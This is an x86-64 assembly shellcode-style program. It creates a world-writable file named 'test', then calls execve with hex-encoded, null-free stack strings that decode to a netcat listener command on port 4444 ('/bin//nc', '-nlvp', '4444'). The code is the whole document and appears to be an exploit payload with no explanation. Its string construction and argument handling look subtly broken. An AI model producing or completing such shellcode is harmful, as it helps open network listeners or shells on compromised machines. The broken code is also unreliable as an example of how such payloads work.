
.section .text
.global main 

main:
  #Create file
  xor %rax, %rax
  mov $85, %al
  mov $0x0074736574, %rdi
  push %rdi
  lea (%rsp), %rdi
  mov $0777, %rsi
  mov $0777, %rdx
  syscall

  #Open netcat
  mov     $59, %rax
  xor     %rdi, %rdi
  push    %rdi
  mov     $0x0034343434, %rdi
  push    %rdi                                                                         
  mov     $0x002070766c6e2d, %rdi
  push    %rdi                                                                       
  mov     $0x636e2f2f6e69622f, %rdi
  push    %rdi
  lea     (%rsp), %rdi
  xor     %rsi, %rsi                 
  xor     %rdx, %rdx                 
  syscall

  
  #Exit(0)
  mov $60, %rax
  xor %rdi, %rdi
  syscall
  
